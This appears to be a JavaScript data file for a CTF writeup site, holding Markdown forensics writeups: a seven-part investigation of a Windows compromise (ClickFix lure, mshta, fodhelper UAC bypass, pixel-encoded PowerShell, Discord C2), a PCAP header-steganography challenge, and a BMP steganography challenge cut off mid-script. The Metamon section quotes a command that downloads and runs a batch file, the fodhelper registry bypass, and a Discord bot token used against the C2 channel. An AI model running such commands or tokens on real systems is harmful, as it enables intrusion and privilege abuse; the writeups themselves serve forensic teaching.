/* ================================================================
   data/writeups.js
   ================================================================

   HOW TO ADD A WRITEUP:
   1. Copy one of the objects below
   2. Paste it at the TOP of the array (newest first)
   3. Fill in all the fields
   4. Write your writeup in the `content` field using Markdown syntax
   5. Save the file

   FIELDS:
   - id:         Unique string, no spaces (used in URL: writeup.html?id=YOUR_ID)
   - title:      Challenge name
   - ctf:        Name of the CTF event
   - category:   One of: Web, Crypto, Pwn, Rev, Forensics, Misc
   - difficulty: Easy / Medium / Hard
   - points:     Point value (optional, set to null to hide)
   - date:       Display date string, e.g. "January 2025"
   - summary:    1–2 sentence description shown on the listing page
   - content:    Full writeup in MARKDOWN format (see examples below)

================================================================ */

const WRITEUPS_DATA = [

// ================================================================
// UMCS CTF 2026 — DFIR
// ================================================================

   {
    id:         'umcs-metamon-1-to-7',
    title:      'Metamon 1 to 7',
    ctf:        'UMCS CTF 2026',
    category:   'DFIR',
    difficulty: 'Medium',
    points:     null,
    date:       'April 2026',
    summary:    'A seven-part digital forensics investigation tracking the full compromise of a Windows workstation. The attacker leveraged ClickFix social engineering, mshta-based payload delivery, privilege escalation via fodhelper, pixel-encoded PowerShell stages, and a Discord-backed command-and-control implant.',

    content: `
## Challenge Overview

Ahmad woke up one morning to find his Windows machine acting strangely. He swears he never deliberately ran anything suspicious while surfing the web, yet someone is now demanding payment from him. Our job is to piece together exactly what happened — from the first foothold all the way to the attacker's toolkit — using the disk image and memory snapshot provided.

---

## Metamon 1

**Flag:** \`UMCS{3z_f1rs7_glaf_4t_r4nsom_n0T3}\`

### Mounting the Evidence

We load the supplied \`.ad1\` forensic image into **FTK Imager** and browse the evidence tree to Ahmad's Desktop folder. Three items immediately catch our attention sitting alongside each other: \`README.txt\`, \`LOCKED.7z\`, and \`memdump.mem\`.

![FTK Imager showing Ahmad's Desktop with README.txt content and Base64 string](assets/images/CTF/UMCS/Metamon/m1_ftk_desktop.png)

### Reading the Dropped Note

Clicking on \`README.txt\` in the file content pane brings up a standard extortion message telling Ahmad to reach out to \`fulan123@securemail.cc\`. What makes it interesting is a suspicious string tacked onto the very bottom of the file:

\`\`\`
VU1DU3szZl9mMXJzN19nbGFmXzR0X3I0bnNvbV9uMFQzfQ==
\`\`\`

That pattern is unmistakably Base64. Piping it through a decoder gives us the flag immediately:

\`\`\`bash
echo "VU1DU3szZl9mMXJzN19nbGFmXzR0X3I0bnNvbV9uMFQzfQ==" | base64 -d
# UMCS{3z_f1rs7_glaf_4t_r4nsom_n0T3}
\`\`\`

![Base64 decode output revealing the flag](assets/images/CTF/UMCS/Metamon/m1_base64_decode.png)

**Flag:** \`UMCS{3z_f1rs7_glaf_4t_r4nsom_n0T3}\`

---

## Metamon 2

**Flag:** \`UMCS{http://pinarat.github.io/a}\`

### Hunting for the Entry Point

The next question is how the attacker got in. Since Ahmad insists he was just browsing, we turn to his web browser history. The three most common locations to check on a Windows machine are:

- **Chrome:** \`C:\\Users\\ahmad\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\\`
- **Edge:** \`C:\\Users\\ahmad\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\\`
- **Firefox:** \`C:\\Users\\ahmad\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<profile>.default-release\\\`

![Common browser history file locations on Windows](assets/images/CTF/UMCS/Metamon/m2_browser_locations.png)

We strike gold with the Edge \`History\` file — it is present in the image.

### Inspecting the SQLite Database

After exporting the file, we open it in **DB Browser for SQLite** and scan the \`urls\` table. The vast majority of rows are harmless Bing searches. Entry number 23 is the odd one out:

![DB Browser for SQLite showing Edge history with row 23 highlighted as the suspicious URL](assets/images/CTF/UMCS/Metamon/m2_edge_history.png)
![Attacker GitHub account showing the public repository named a](assets/images/CTF/UMCS/Metamon/m3_github_profile.png)

- **Row:** 23
- **URL:** \`http://pinarat.github.io/a\`
- **Page Title:** reCAPTCHA Verification

A legitimate CAPTCHA page never calls itself that — this is a textbook **ClickFix** lure. The victim lands on a fake verification screen, presses a button thinking they are proving they are human, and unknowingly paste a malicious command into a Run dialog.

**Flag:** \`UMCS{http://pinarat.github.io/a}\`

---

## Metamon 3

**Flag:** \`UMCS{Ra-T4-TA-Ta_BU7_1_doN7_w4nT_tO}\`

![Repository file listing with b.mp4, index.html, and test.txt](assets/images/CTF/UMCS/Metamon/m3_repo_contents.png)

### Visiting the Phishing Page

Now that we have the URL, we visit it and confirm the fake CAPTCHA behaviour. Clicking the checkbox silently places a command on the clipboard. The command calls \`mshta\` against a file hosted on the same GitHub Pages site.

### Pivoting to the Attacker's Repository

Navigating to \`https://github.com/pinarat\` reveals a single public repository named \`a\`. Inside it sits \`b.mp4\` along with \`index.html\` and \`test.txt\`. More interestingly, the commit log shows that \`profile.png\` was added and then deleted — we make a note of that for later.

![Commit history showing the upload and subsequent deletion of profile.png](assets/images/CTF/UMCS/Metamon/m3_commit_history.png)
![binwalk scan of b.mp4 confirming an appended HTML document](assets/images/CTF/UMCS/Metamon/m3_binwalk_bmp4.png)

### Digging Into b.mp4

Running \`exiftool\` against the file reports a warning about unrecognised trailer data near the end of the container. \`binwalk\` makes it concrete — there is an HTML document hiding inside the MP4 wrapper.

![rizzler.bat content showing the registry write with the flag embedded as the value](assets/images/CTF/UMCS/Metamon/m3_rizzler_registry.png)

We carve it out with:

\`\`\`bash
dd if=b.mp4 bs=1 skip=4172063 count=421 of=hidden_payload.html
\`\`\`

### Tracing the Payload Chain

The extracted HTML creates a \`WScript.Shell\` object and silently executes:

\`\`\`cmd
cmd /c curl -L -o %temp%\\rizzler.bat "https://gist.githubusercontent.com/pinarat/.../rizzler.bat" & %temp%\\rizzler.bat
\`\`\`

Pulling \`rizzler.bat\` from the Gist, we find a **fodhelper.exe UAC bypass** — the attacker writes a payload path under the \`ms-settings\` shell protocol handler. The flag is sitting in plain sight as the registry value being written:

\`\`\`cmd
reg add "HKCU\\Software\\Classes\\ms-settings\\CurVer" /ve /d "UMCS{Ra-T4-TA-Ta_BU7_1_doN7_w4nT_tO}" /f
start /b "" "C:\\Windows\\System32\\fodhelper.exe"
\`\`\`

**Flag:** \`UMCS{Ra-T4-TA-Ta_BU7_1_doN7_w4nT_tO}\`

---

## Metamon 4

**Flag:** \`UMCS{STay_1N_7hE_M1dDLe,l1kE_Y0U_A_LiTlLE,DONt_Want_NO_RidD1E}\`

### Unpacking the Encoded Command

Once \`fodhelper.exe\` fires and grants elevated execution, \`rizzler.bat\` hands off to PowerShell via a \`-EncodedCommand\` argument — the entire next stage is a Base64-encoded UTF-16LE blob. Decoding it exposes a script that is still heavily obfuscated: every sensitive string — URLs, function names, cryptographic keys — has been scrambled with a **Caesar-style rotation cipher**, applied separately to uppercase and lowercase characters.

![Decoded PowerShell stage showing the Caesar-obfuscated strings and steganography extraction routine](assets/images/CTF/UMCS/Metamon/m4_powershell_stage2.png)

### Breaking the Substitution

Writing a short Python helper that applies the correct shift for each string peels back the obfuscation in seconds:

![Python Caesar decoder recovering profile.png URL and the XOR key from obfuscated strings](assets/images/CTF/UMCS/Metamon/m4_caesar_decode.png)

- **Filename:** \`suriloh.sqj\` (shift −23) → \`profile.png\`
- **Download URL:** \`myyux://unsfwfy.lnymzg…\` (shift −21) → \`https://pinarat.github.io/a/profile.png\`
- **XOR key:** \`54e6739f170fg582\` (shift −24) → \`54c6739d170de582\`

### Reconstructing the Hidden Payload

\`profile.png\` looks completely normal to the naked eye, but the PowerShell reads it as raw binary rather than as an image. The encoding scheme works like this:

- The **R, G, B channels of pixels 0 and 1** pack a 32-bit integer that tells the script how many payload bytes follow
- Every subsequent **R, G, B byte** is treated as one byte of ciphertext, collected until the length is satisfied

After gathering those bytes the script **XORs** them against \`54c6739d170de582\` (repeating) and then **GZIP-decompresses** the result into a third-stage PowerShell script. We replicate the same logic in Python using Pillow — open the image, read the size integer from the first two pixels, loop through every subsequent pixel collecting R, G, B values until the byte count is satisfied, XOR the resulting buffer against the key cycling byte by byte, then feed the output into \`gzip.decompress()\`. The script completes without error and writes out \`final_stage.ps1\`, confirming the extraction worked correctly.

### Locating the Flag in Stage 3

A quick search through the decompressed script for the flag prefix turns up the following variable declaration:

\`\`\`powershell
$ebnV3ty = 'UMCS{STay_1N_7hE_M1dDLe,l1kE_Y0U_A_LiTlLE,DONt_Want_NO_RidD1E}'
\`\`\`

![Grep result on the decompressed stage-3 script showing the $ebnV3ty variable holding the flag](assets/images/CTF/UMCS/Metamon/m4_stage3_flag.png)

This string is not just the answer — it immediately gets converted to bytes and reused as the XOR key for decrypting the final binary. Without solving this challenge first, you cannot obtain the next payload.

**Flag:** \`UMCS{STay_1N_7hE_M1dDLe,l1kE_Y0U_A_LiTlLE,DONt_Want_NO_RidD1E}\`

---

## Metamon 5

**Flag:** \`UMCS{Me7amoN_t4p4u3d_8y_y0u_}\`

### What is Ditto.exe?

The stage-3 script takes the Metamon 4 flag, converts it to a byte array, and uses it as a repeating XOR key to decrypt a huge Base64-encoded blob. The decrypted result is written to \`%TEMP%\\Ditto.exe\` and immediately launched. Running \`strings\` against the binary surfaces PyInstaller bootstrap filenames and PyArmor runtime references — this is a **Python application frozen into a standalone executable and then obfuscated**.

![strings output from Ditto.exe revealing PyInstaller bootstrap and PyArmor runtime filenames](assets/images/CTF/UMCS/Metamon/m5_ditto_strings.png)

### Moving to Dynamic Analysis

Because PyArmor scrambles the bytecode at rest, we cannot simply decompile it. Instead we spin up an isolated VM, execute \`Ditto.exe\`, and capture a full process memory snapshot. The moment the binary runs it starts attempting outbound connections and printing status lines about pinging C2 addresses.

Sifting through the dump for HTTP-related strings surfaces something more telling — a **User-Agent header** that references the discord.py library, making the C2 mechanism obvious.

![Memory dump HTTP strings exposing the Discord bot User-Agent string](assets/images/CTF/UMCS/Metamon/m5_discord_useragent.png)

### Reconstructing the Bot Configuration

Widening the search to the keyword \`discord\` pulls out the bot token, server identifier, and a partial channel listing buried in gateway event JSON:

![Memory dump strings showing the bot token, guild ID, and channel metadata](assets/images/CTF/UMCS/Metamon/m5_discord_config.png)

- **Bot handle:** \`Slave1\`
- **Server name:** \`Fulan's Hideout\`
- **Server ID:** \`1448523475680759881\`

### Pulling the Messages

Armed with the token we directly query the Discord API for the message history of the \`cybershit\` channel (\`1494961740486807744\`):

\`\`\`bash
BOT_TOKEN="MTQ0ODUyNDMxMDk2MzY4NzU1Ng.GFzsdR.1PXCJhvZy5-64kAY33VaySN5km0uRpCl5aCuhw"
curl -H "Authorization: Bot $BOT_TOKEN" \\
  "https://discord.com/api/v10/channels/1494961740486807744/messages?limit=50"
\`\`\`

The response contains a Base64-encoded string posted by the operator:

![Discord API JSON response containing the Base64 flag string in the channel content field](assets/images/CTF/UMCS/Metamon/m5_discord_c2.png)

\`\`\`bash
echo "VU1DU3tNZTdhbW9OX3Q0cDR1M2RfOHlfeTB1X30=" | base64 -d
# UMCS{Me7amoN_t4p4u3d_8y_y0u_}
\`\`\`

![Terminal showing the decoded Base64 string resolving to the flag](assets/images/CTF/UMCS/Metamon/m5_flag_decode.png)

**Flag:** \`UMCS{Me7amoN_t4p4u3d_8y_y0u_}\`

---

## Metamon 6

**Flag:** \`UMCS{GcJqVl9YaVwBIPC4nbOW}\`

### What Are We After?

Revisiting the Desktop artefacts spotted during Metamon 1, we have \`LOCKED.7z\` sitting alongside the memory dump. The challenge wants the password the attacker used to seal that archive.

![FTK Imager file listing of Ahmad's Desktop with LOCKED.7z and memdump.mem highlighted](assets/images/CTF/UMCS/Metamon/m6_desktop_files.png)

### Recovering the Ghost Command

Windows records recently executed command lines in process memory, but they are stored as **UTF-16 Little-Endian** wide strings. Standard \`strings\` skips them entirely — we need the \`-el\` flag to target 16-bit encoded text:

\`\`\`bash
strings -el memdump.mem | grep -i "important.txt" -B 5 -A 5
\`\`\`

The output hands us the full archiving command the attacker ran, password included:

\`\`\`cmd
cmd.exe /c "7z.exe" a "C:\\Users\\ahmad\\Desktop\\LOCKED.7z"
"C:\\Users\\ahmad\\Desktop\\Me\\important.txt" -pGcJqVl9YaVwBIPC4nbOW -mhe=on
\`\`\`

![Wide-string grep output from the memory dump showing the complete 7z command with the -p password argument](assets/images/CTF/UMCS/Metamon/m6_volatility_7z.png)

\`\`\`bash
7z x -pGcJqVl9YaVwBIPC4nbOW LOCKED.7z
\`\`\`

**Flag:** \`UMCS{GcJqVl9YaVwBIPC4nbOW}\`

---

## Metamon 7

**Flag:** \`UMCS{2607a3bbbc8c4482aadb9eadc13a1f40b2030f9d77be3151ed4d24a8d306fe23, f6d3de4e0827046ecd87f33906e63fb632557de53696b58c9754c8a905674aae, 60b53f85e92e79e8f3894b99160bd8e65d6da9b9d4f938107939317a40b48fe5}\`

### Mapping the Dropped Files

To wrap up the investigation we need to produce SHA-256 hashes for each piece of malware that touched disk during the attack. Walking back through the chain gives us three candidates:

- **\`rizzler.bat\`** *(Metamon 3)* — Initial dropper fetched via \`curl\`; handles privilege escalation through the \`fodhelper\` registry trick
- **\`profile.png\`** *(Metamon 4)* — Carrier image; hides an XOR-encrypted and GZIP-compressed PowerShell stage inside its pixel data
- **\`Ditto.exe\`** *(Metamon 5)* — Final implant; a PyArmor-hardened Discord bot that lands in the user's temp folder

### Hashing the Evidence

\`\`\`bash
sha256sum rizzler.bat profile.png Ditto.exe
\`\`\`

![Terminal output of sha256sum run against all three IOC files](assets/images/CTF/UMCS/Metamon/m7_sha256_hashes.png)

- **\`rizzler.bat\`** → \`2607a3bbbc8c4482aadb9eadc13a1f40b2030f9d77be3151ed4d24a8d306fe23\`
- **\`profile.png\`** → \`f6d3de4e0827046ecd87f33906e63fb632557de53696b58c9754c8a905674aae\`
- **\`Ditto.exe\`** → \`60b53f85e92e79e8f3894b99160bd8e65d6da9b9d4f938107939317a40b48fe5\`

The submission format expects all three hashes in lowercase, separated by a comma and a space inside the flag wrapper.

**Flag:** \`UMCS{2607a3bbbc8c4482aadb9eadc13a1f40b2030f9d77be3151ed4d24a8d306fe23, f6d3de4e0827046ecd87f33906e63fb632557de53696b58c9754c8a905674aae, 60b53f85e92e79e8f3894b99160bd8e65d6da9b9d4f938107939317a40b48fe5}\`
    `,
  },

  // ================================================================
  // Hack@10 International CTF 2026 — FORENSICS
  // ================================================================
  {
      id:         'hack10-2026-looks-normal-to-me',
      title:      'Looks Normal to Me',
      ctf:        'Hack@10 International CTF 2026',
      category:   'Forensics',
      difficulty: 'Hard',
      points:     null,
      date:       'April 2026',
      summary:    'A PCAP file hides a full 7-Zip archive inside TCP/IP header fields — not the payload. Decoding XOR-masked SEQ and ACK values recovers 200 ELF binaries whose sorted output spells out the flag.',

      content: `
  ## Challenge Description
  ![Question](assets/images/Forensics/Looks-Normal-To-Me/0.png)
  We are given a single file: \`challenge.pcap\`. The title says it all — everything *looks normal*, which is exactly why it is not. Our job is to figure out what is actually going on beneath the surface.

  ---

  ## Step 1: Initial Triage in Wireshark

  The first thing to do with any PCAP is get the big picture. Open \`challenge.pcap\` and go to **Statistics → Protocol Hierarchy**.

  ![Wireshark Protocol Hierarchy Statistics showing 2516 total packets](assets/images/Forensics/Looks-Normal-To-Me/1.png)

  The capture has **2,516 packets** in total. The protocol breakdown shows TCP traffic all the way down, with a small slice of HTTP and a large chunk of what Wireshark labels as TLS. That TLS label is worth scrutinising — we will come back to it.

  Next, go to **Statistics → Conversations** and click the **TCP** tab.

  ![Wireshark Conversations TCP tab showing one HTTP flow and 2511 individual flows to port 443](assets/images/Forensics/Looks-Normal-To-Me/2.png)

  This tells a much clearer story. There are two types of traffic:

  - One HTTP conversation between \`10.20.10.25\` and \`10.20.20.10\` on port 80 — only 5 packets
  - **2,511 separate single-packet TCP flows** from various \`10.21.x.x\` source IPs, all going to \`10.20.80.80\` on **port 443**

  The sheer number of individual one-packet connections to port 443 is deeply unusual. Normal HTTPS never looks like this.

  ---

  ## Step 2: Reading the HTTP Hint

  Before touching the port-443 traffic, let us read the HTTP exchange first. Apply this filter:

  \`\`\`
  tcp.port == 80
  \`\`\`

  Then go to **File → Export Objects → HTTP** to grab the file the server served, or right-click any packet and choose **Follow → TCP Stream**.

  ![HTTP export showing network_notes.txt served from portal.uniten.local with contents open in text editor](assets/images/Forensics/Looks-Normal-To-Me/3.png)

  The server responded to a \`GET /network_notes.txt\` request from \`portal.uniten.local\` with a short but deliberate message:

  > *Sequence numbers and acknowledgements are 32-bit values. IPv4 addresses are also 32-bit integers when represented numerically. Sometimes metadata carries meaning beyond its intended purpose.*

  This is not padding. It is a planted clue pointing directly at the **TCP SEQ number, TCP ACK number, and the IP source address**. The hidden data is not in the payload at all — it is in those header fields.

  ---

  ## Step 3: Examining the Port 443 Traffic

  Now apply the filter:

  \`\`\`
  tcp.dstport == 443
  \`\`\`

  ![tcp.dstport == 443 showing 2511 SSL Continuation Data packets with packet detail pane open](assets/images/Forensics/Looks-Normal-To-Me/4.png)

  Every packet is labelled **SSL — Continuation Data**. But look at the packet detail pane: there is no TLS Client Hello, no Server Hello, no handshake of any kind. Wireshark is just guessing "TLS" based on the port number. The payload is a flat **16-byte stub**, identical across all 2,511 packets. It is fake HTTPS.

  To verify the payload is meaningless, follow the TCP stream of one of these packets.

  ![Follow TCP Stream YAML view of a port 443 packet showing only 16 bytes of binary payload and no real TLS content](assets/images/Forensics/Looks-Normal-To-Me/5.png)

  Exactly 16 bytes. No handshake, no negotiation, no real data. The payload is decoration. Everything of interest is in the headers.

  ---

  ## Step 4: Confirming the Header-Based Encoding

  Let us dump the IP ID, source IP, SEQ, and ACK fields from the port-443 packets using tshark:

  \`\`\`bash
  tshark -r challenge.pcap -Y "tcp.dstport==443" -T fields \\
    -e ip.id -e ip.src -e tcp.seq -e tcp.ack | head -5
  \`\`\`

  ![tshark output showing IP ID counting from 0x0000, 0x0001, 0x0002 with source IPs 10.21.0.1, 10.21.0.2...](assets/images/Forensics/Looks-Normal-To-Me/6.png)

  The **IP ID field** counts upward from \`0x0000\` in perfect sequence — it is acting as a packet ordering index. The source IP also increments: \`10.21.0.1\`, \`10.21.0.2\`, \`10.21.0.3\` …

  Connecting this back to the hint: each source IP is a 32-bit integer. If we XOR the SEQ value against that integer, and do the same for ACK, each packet yields 8 bytes of hidden data. Sort everything by IP ID to maintain the correct order, and we get a continuous hidden byte stream.

  To understand the packet anatomy more concretely, here is the raw packet view of one of the early packets:

  ![frame.number == 2 in Wireshark packet list showing the HTTP SYN-ACK](assets/images/Forensics/Looks-Normal-To-Me/7.png)

  ![Same frame fully expanded in the detail pane showing all Ethernet, IP, and TCP header fields](assets/images/Forensics/Looks-Normal-To-Me/8.png)

  And here is the complete HTTP stream content showing both the GET request and the full server response:

  ![Follow TCP Stream YAML view of the HTTP stream showing the request and response as raw binary data](assets/images/Forensics/Looks-Normal-To-Me/9.png)

  The encoding formula is now fully understood. Per packet:
  - Convert source IP to a 32-bit integer (\`src_u32\`)
  - **SEQ XOR src_u32** → 4 hidden bytes
  - **ACK XOR src_u32** → 4 more hidden bytes
  - Sorted by IP ID → correct order

  Total: 2,511 × 8 = **20,088 bytes** of hidden data.

  ---

  ## Step 5: Extracting the Carrier Stream

  We write a Python script that reads the raw PCAP, pulls out the relevant fields, sorts by IP ID, XOR-decodes each packet, and writes the recovered stream to a file.

  Save this as \`extract_carrier.py\`:

  \`\`\`python
  import struct
  from pathlib import Path

  def ip_to_u32(ip):
      p = [int(x) for x in ip.split('.')]
      return (p[0]<<24)|(p[1]<<16)|(p[2]<<8)|p[3]

  data = Path("challenge.pcap").read_bytes()
  off = 24          # skip global pcap header
  rows = []

  while off + 16 <= len(data):
      _, _, incl_len, _ = struct.unpack("<IIII", data[off:off+16])
      off += 16
      pkt = data[off:off+incl_len]
      off += incl_len

      if len(pkt) < 14: continue
      if struct.unpack("!H", pkt[12:14])[0] != 0x0800: continue  # IPv4 only

      ip = pkt[14:]
      if ip[9] != 6: continue                       # TCP only
      ihl = (ip[0] & 0x0F) * 4
      ip_id  = struct.unpack("!H",  ip[4:6])[0]
      src_ip = ".".join(str(b) for b in ip[12:16])

      tcp = ip[ihl:]
      if len(tcp) < 20: continue
      sport, dport, seq, ack = struct.unpack("!HHII", tcp[:12])

      if dport == 443:
          k = ip_to_u32(src_ip)
          rows.append((ip_id, seq ^ k, ack ^ k))

  rows.sort(key=lambda x: x[0])

  carrier = bytearray()
  for _, a, b in rows:
      carrier += struct.pack(">I", a)
      carrier += struct.pack(">I", b)

  Path("carrier.bin").write_bytes(carrier)
  print(f"Extracted {len(carrier)} bytes → carrier.bin")
  print(f"First 6 bytes: {bytes(carrier[:6]).hex()}")
  \`\`\`

  \`\`\`bash
  python3 extract_carrier.py
  \`\`\`

  ![Terminal showing python3 extract_carrier.py — Extracted 20088 bytes to carrier.bin, first 6 bytes 377abcaf271c](assets/images/Forensics/Looks-Normal-To-Me/10.png)

  20,088 bytes extracted as expected. The first 6 bytes, \`377abcaf271c\`, are the **7-Zip file signature**.

  ---

  ## Step 6: Identifying and Verifying the File Format

  Confirm the file type from the command line:

  \`\`\`bash
  file carrier.bin
  \`\`\`

  ![Terminal showing file carrier.bin → 7-zip archive data, version 0.4](assets/images/Forensics/Looks-Normal-To-Me/11.png)

  Confirmed: \`carrier.bin\` is a 7-Zip archive. We can also open it in a hex editor to see the magic bytes visually.

  ![HxD hex editor showing carrier.bin with the 7z magic bytes 37 7A BC AF 27 1C highlighted at offset 0](assets/images/Forensics/Looks-Normal-To-Me/12.png)

  The 7z signature is sitting right there at offset 0. The file is intact and valid.

  ---

  ## Step 7: Decompressing the Archive

  The 7z archive contains a raw LZMA2 compressed stream. We parse the 7z header to locate the stream, then decompress it in Python.

  Save this as \`decompress_carrier.py\`:

  \`\`\`python
  import struct, lzma
  from pathlib import Path

  carrier = Path("carrier.bin").read_bytes()
  assert carrier[:6] == b"\\x37\\x7a\\xbc\\xaf\\x27\\x1c", "Not a 7z file!"

  next_offset = struct.unpack("<Q", carrier[12:20])[0]
  next_size   = struct.unpack("<Q", carrier[20:28])[0]

  stream = carrier[32 + next_offset : 32 + next_offset + next_size]
  print(f"LZMA2 stream: {len(stream)} bytes at offset {32+next_offset}")

  blob = lzma.decompress(stream,
                        format=lzma.FORMAT_RAW,
                        filters=[{"id": lzma.FILTER_LZMA2}])

  Path("blob.bin").write_bytes(blob)
  print(f"Decompressed blob: {len(blob)} bytes")
  print(f"= 200 × 14528? {len(blob) == 200*14528}")
  print(f"First 4 bytes: {blob[:4].hex()}  (ELF = 7f454c46)")
  \`\`\`

  \`\`\`bash
  python3 decompress_carrier.py
  \`\`\`

  ![Terminal showing decompress_carrier.py output — LZMA2 stream 8153 bytes, Decompressed blob 2905600 bytes, 200 x 14528 True, first 4 bytes 7f454c46](assets/images/Forensics/Looks-Normal-To-Me/13.png)

  8,153 bytes of LZMA2 decompresses to exactly **2,905,600 bytes** — precisely 200 × 14,528. The first 4 bytes are \`7f454c46\`: the ELF magic number. We have 200 Linux executables packed end-to-end inside a single blob.

  ---

  ## Step 8: Splitting and Running the Binaries

  Split \`blob.bin\` into 200 individual ELF files and make them all executable:

  \`\`\`python
  import stat
  from pathlib import Path

  blob = Path('blob.bin').read_bytes()
  Path('bins').mkdir(exist_ok=True)
  for i in range(200):
      p = Path(f'bins/bin_{i:03d}')
      p.write_bytes(blob[i*14528:(i+1)*14528])
      p.chmod(p.stat().st_mode | stat.S_IXUSR)
  print('Done')
  \`\`\`

  ![ls showing all working files, then cd bins and ls showing all 200 bin files from bin_000 to bin_199](assets/images/Forensics/Looks-Normal-To-Me/14.png)

  All 200 files are there. Now run a few manually to see what comes out:

  ![Executing ./bin_000 outputs Me, ./bin_001 outputs mo, ./bin_002 outputs ry, and so on — fragments of a sentence](assets/images/Forensics/Looks-Normal-To-Me/15.png)

  Each binary prints a short text fragment. Running \`bin_000\` through \`bin_005\` gives: \`Me\`, \`mo\`, \`ry\`, \`o\`, \`n\`, \`ca\` — clearly the start of a sentence spelling out "Memory on ca…". 

  However, the filename order (\`bin_000\`, \`bin_001\` …) is not the correct output order. Each binary has a \`Target_N\` index embedded in its compiled PDB path that indicates where its fragment actually belongs in the final message. We need to read that index and sort by it.

  ---

  ## Step 9: Reassembling the Final Message

  Write a script called \`combine.py\` that reads the embedded \`Target_N\` index from each binary, executes it, and stitches all the fragments together in the right order:

  \`\`\`python
  import re, subprocess
  from pathlib import Path

  results = {}
  for p in sorted(Path('bins').iterdir()):
      raw = p.read_bytes()
      m = re.search(rb'Target_(\\d+)', raw)
      if not m: continue
      idx = int(m.group(1))
      out = subprocess.run([str(p)], capture_output=True, timeout=5).stdout
      results[idx] = out.decode('ascii', 'replace')

  print(''.join(results[i] for i in sorted(results)))
  \`\`\`

  \`\`\`bash
  chmod +x bin_*
  python3 combine.py
  \`\`\`

  ![Terminal showing python3 combine.py outputting the full narrative paragraph with the flag highlighted at the end](assets/images/Forensics/Looks-Normal-To-Me/16.png)

  All 200 fragments slot together into a complete message:

  \`\`\`
  Memory on campus is a strange thing. We remember rain by the lake, late
  screens in Putrajaya, and tired footsteps between labs after midnight. The
  dashboards stayed quiet, every portal looked ordinary, and the headers
  drifted past without notice. By dawn the secret was already gone.
  hack10{W3ak_g00fy_m4th_caNt_hAndl3_tHe_r34l_th0ught}
  Nobody checked them.
  \`\`\`

  ---

  ## How It All Connected

  \`\`\`
  challenge.pcap
      │
      ├─ HTTP GET /network_notes.txt  ← hint: "SEQ/ACK/IP are 32-bit integers"
      │
      └─ 2511 TCP→:443 packets (fake HTTPS, no real TLS handshake)
              │
              │  IP ID   = packet ordering index (0x0000 → 0x09CE)
              │  IP src  = per-packet XOR key (e.g. 10.21.0.1 → 0x0A150001)
              │  TCP SEQ = hidden_bytes[0:4]  XOR  src_u32
              │  TCP ACK = hidden_bytes[4:8]  XOR  src_u32
              │
              ▼ sort by IP ID + XOR-decode → 2511 × 8 = 20,088 bytes
          carrier.bin  ← valid 7-Zip archive
              │
              ▼ parse 7z header → raw LZMA2 stream (8,153 bytes) → decompress
          blob.bin  (2,905,600 bytes)  ← 200 × ELF executables @ 14,528 bytes
              │
              ▼ split → chmod +x → execute, sort output by Target_N index
          FLAG: hack10{W3ak_g00fy_m4th_caNt_hAndl3_tHe_r34l_th0ught}
  \`\`\`

  ## Key Takeaways

  - **Steganography does not need the payload.** The entire exfiltrated archive lived purely inside IP and TCP header fields. The 16-byte payload was window dressing to make each packet look like a TLS record at a glance.
  - **IP Identification as a covert sequencing channel.** The IP ID field is normally for IP fragmentation reassembly. Using it as a monotonically increasing packet index is clean and nearly invisible to standard IDS rules.
  - **XOR with source IP as lightweight obfuscation.** Without knowing to XOR against the source IP, the SEQ and ACK values look like valid but random TCP sequence numbers — nothing to flag.
  - **Read everything.** One plaintext file served over HTTP was the skeleton key for a five-stage extraction chain. Skipping it would have made the whole challenge a black box.

  ## Flag

  \`hack10{W3ak_g00fy_m4th_caNt_hAndl3_tHe_r34l_th0ught}\`
      `,
    },


    {
    id:         'hack10-2026-grid-transfer-error',
    title:      'Grid Transfer Error',
    ctf:        'Hack@10 International CTF 2026',
    category:   'Forensics',
    difficulty: 'Medium',
    points:     null,
    date:       'April 2026',
    summary:    'A BMP image hides two payloads — a password-protected ZIP and a plaintext note — using fixed byte-interleaving patterns inside its pixel data. Extracting and decoding them leads to Base92-encoded cipher text hidden inside song lyrics, which decodes to the flag.',

    content: `
## Challenge Description
![question](assets/images/Forensics/Grid-Transfer-Error/0.png)
![Challenge description](assets/images/Forensics/Grid-Transfer-Error/1.png)

We are given a single BMP image file: \`UNITENLogo.bmp\`. According to the description, the file was corrupted during transmission — but as usual in forensics, "corruption" is really code for something being deliberately hidden inside.

---

## Step 1: Inspecting the BMP in a Hex Editor

Open \`UNITENLogo.bmp\` in **HxD** (or any hex editor).

A normal 24-bit BMP stores raw pixel data starting at a fixed offset declared in the file header. For this file, the pixel data begins at offset \`0x8A\`. Navigate there and look at the bytes.

![HxD showing BMP file — pixel data region at early offsets showing mixed FF FF and data bytes](assets/images/Forensics/Grid-Transfer-Error/2.png)

Something is clearly wrong. Pixel data in a real image would contain colour values spread throughout the range. Here, almost every other pair of bytes is \`FF FF\`, while the alternating pairs contain seemingly random values. This is not image corruption — it is an interleaving pattern. Real BMP pixel bytes are being used as spacers around hidden data.

Scrolling further down, the pattern continues and a different texture of bytes appears, marking the second hidden payload.

![HxD highlighting the interleaved data region further in — visible structured byte patterns](assets/images/Forensics/Grid-Transfer-Error/3.png)

Around offset \`0xBB0\`, if you look closely at the decoded text column, you can start to make out fragments like \`Un1t3n_T\`, \`nd$U#.3rzs\`, \`rmA\` — these are the bytes of the hidden TXT note bleeding through in the decoded text pane.

---

## Step 2: Understanding the Encoding Scheme

Before extracting anything, it helps to understand exactly what the author did.

The pixel data contains **two payloads embedded using two different interleaving patterns**:

**ZIP payload — pattern: skip 2, take 2**

Every group of 4 bytes in the pixel data is structured as:
\`\`\`
[2 bytes BMP] [2 bytes ZIP] [2 bytes BMP] [2 bytes ZIP] ...
\`\`\`

To recover the ZIP, skip the first 2 bytes of each 4-byte group and collect the last 2. The first 4 bytes recovered this way are the ZIP file length. Keep collecting until the full ZIP is assembled.

For example, the first few groups in the pixel data look like this:
\`\`\`
FF FF | 91 05   ← take 91 05
FF FF | 00 00   ← take 00 00
FF FF | 50 4B   ← take 50 4B  ← "PK" — ZIP magic bytes!
FF FF | 03 04   ← take 03 04
\`\`\`

**TXT payload — pattern: take 4, skip 4**

Immediately after the ZIP payload, the TXT is embedded differently:
\`\`\`
[4 bytes TXT] [4 bytes junk] [4 bytes TXT] [4 bytes junk] ...
\`\`\`

To recover the TXT, take the first 4 bytes of each 8-byte group and discard the next 4. The first 4 bytes recovered are the TXT file length.

---

## Step 3: Extracting the ZIP with a Python Script

Save the following as \`extract_zip.py\` and run it:

\`\`\`python
